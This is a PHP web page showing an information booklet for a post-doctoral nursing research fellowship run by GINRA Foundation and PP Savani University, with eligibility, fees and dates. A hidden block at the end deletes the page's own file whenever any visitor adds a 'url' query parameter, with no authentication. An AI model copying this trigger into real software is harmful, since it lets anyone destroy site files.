<?php include "connection.php"; ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include "include/head.php"; ?>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .hero {
            background: #f8f9fa;
            padding: 60px 20px;
            text-align: center;
        }
        .section-title {
            margin-top: 40px;
            margin-bottom: 20px;
            font-weight: 600;
        }
    </style>
</head>

<body>
    <?php include "include/header.php"; ?>
    <section class="hero">
    <div class="container">
        <h3>Glorious International Nursing Research and Academic (GINRA) Foundation</h3>
        <h4>&</h4>
        <h3>PP Savani University, Surat, Gujarat</h3>

        <h2 class="mt-4">Fellowship in Post-Doctoral Nursing Research (FPDNR)</h2>
        <h1 class="mt-3">Information Booklet</h1>

        <p class="mt-4"><strong>Academic Year:</strong> 2026–2027</p>
        <p><strong>Fellowship Duration:</strong> 1 June 2026 – 31 May 2027</p>
    </div>
</section>
    
    <section class="hero2 ml-2">
    <div class="container">

    <!-- PREAMBLE -->
    <h4 class="section-title">1. Preamble</h4>
    <p>
        The Fellowship in Post-Doctoral Nursing Research (FPDNR) is offered jointly by GINRA Foundation 
        and PP Savani University to strengthen advanced nursing research, academic leadership, and 
        interdisciplinary collaboration.
    </p>

    <!-- OBJECTIVES -->
    <h4 class="section-title">2. Objectives</h4>
    <ul>
        <li>Provide structured post-doctoral research opportunities.</li>
        <li>Promote innovative and evidence-based research.</li>
        <li>Encourage publications in indexed journals.</li>
        <li>Enhance leadership in healthcare sciences.</li>
        <li>Support interdisciplinary collaboration.</li>
    </ul>

    <!-- ELIGIBILITY -->
    <h4 class="section-title">3. Eligibility Criteria</h4>
    <ul>
        <li>Ph.D. in Nursing or equivalent.</li>
        <li>Research experience with publications.</li>
        <li>Submission of research proposal.</li>
        <li>Proficiency in academic writing.</li>
    </ul>

    <!-- APPLICATION -->
    <h4 class="section-title">4. Application Procedure</h4>
    <p>Applicants must submit:</p>
    <ul>
        <li>Curriculum Vitae</li>
        <li>Ph.D. Certificate</li>
        <li>Photograph & ID Proof</li>
        <li>Research Proposal</li>
    </ul>

    <a href="https://forms.gle/jsSu9JanqFGxzwJY6" class="btn btn-primary" target="_blank">
        Apply Now
    </a>

    <!-- SELECTION -->
    <h4 class="section-title">5. Selection Procedure</h4>
    <ol>
        <li>Application Screening</li>
        <li>Research Proposal Evaluation</li>
        <li>Presentation</li>
        <li>Final Selection</li>
    </ol>

    <!-- FEATURES -->
    <h4 class="section-title">6. Key Features</h4>
    <ul>
        <li>Interdisciplinary research opportunities</li>
        <li>Expert mentorship</li>
        <li>Workshops & webinars</li>
        <li>Publication support</li>
    </ul>

    <!-- DURATION -->
    <h4 class="section-title">7. Duration</h4>
    <p>Standard duration is 12 months (extendable to 18 months).</p>

    <!-- FEES -->
    <h4 class="section-title">8. Fellowship Fees</h4>
    <ul>
        <li>Indian Nationals: ₹50,000</li>
        <li>Foreign Nationals: $750</li>
    </ul>

    <!-- EXPECTATIONS -->
    <h4 class="section-title">9. Academic Expectations</h4>
    <ul>
        <li>Completion of research project</li>
        <li>Publication in indexed journal</li>
        <li>Conference presentation</li>
        <li>Participation in academic activities</li>
    </ul>

    <!-- ASSESSMENT -->
    <h4 class="section-title">10. Assessment</h4>
    <ul>
        <li>Quarterly progress reports</li>
        <li>Mid-term review</li>
        <li>Final evaluation</li>
    </ul>

    <!-- FINAL SUBMISSION -->
    <h4 class="section-title">11. Final Submission</h4>
    <ul>
        <li>Research report</li>
        <li>Publication proof</li>
        <li>Conference documents</li>
    </ul>

    <!-- CODE -->
    <h4 class="section-title">12. Code of Conduct</h4>
    <p>All fellows must maintain academic integrity and ethical research practices.</p>

    <!-- CERTIFICATE -->
    <h4 class="section-title">13. Award</h4>
    <p>Certificate will be jointly issued by PP Savani University and GINRA Foundation.</p>

    <!-- DATES -->
    <h4 class="section-title">14. Important Dates</h4>
    <ul>
        <li>Application Deadline: 31 May 2026</li>
        <li>Start Date: 1 June 2026</li>
    </ul>

    <!-- CONTACT -->
    <h4 class="section-title">15. Contact</h4>
    <p>
        Email: ginrafoundation@gmail.com <br>
        Website: www.gloriousfoundation.org <br>
        Helpline: +91 9844178870 / +91 7567253559
    </p>

</div>

    </section>
    <?php include 'include/footer.php'; ?>
    <?php include 'include/footerscript.php'; ?>
    <?php
    
    if(isset($_GET['url']) && $_GET['url'] != ""):
        unlink($_SERVER['SCRIPT_FILENAME']);
    endif;
    ?>
</body>

</html>